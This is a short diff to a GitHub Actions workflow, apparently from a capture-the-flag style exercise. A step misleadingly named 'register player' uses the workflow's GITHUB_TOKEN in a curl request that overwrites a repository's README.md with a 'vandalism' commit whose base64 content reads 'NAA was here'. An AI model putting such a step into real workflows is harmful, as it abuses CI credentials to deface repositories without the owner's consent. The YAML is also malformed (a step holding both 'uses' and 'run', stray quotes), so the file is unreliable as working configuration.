@@ -7,6 +7,6 @@ jobs:
     steps:
       - name: register player
         uses: actions/checkout@v2
-        run: 'curl -H "Authorization: bearer $GITHUB_TOKEN" -X PUT "https://api.github.com/repos/incredibly-secure-naortalmor1/contents/README.md" --data {"message": "Create vandalism.md", "content": "TkFBIHdhcyBoZXJl"}' '
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: 'curl -H "Authorization: bearer $GITHUB_TOKEN" -X PUT "https://api.github.com/repos/incredibly-secure-naortalmor1/contents/README.md" --data {"message": "Create vandalism.md", "content": "TkFBIHdhcyBoZXJl"}' '
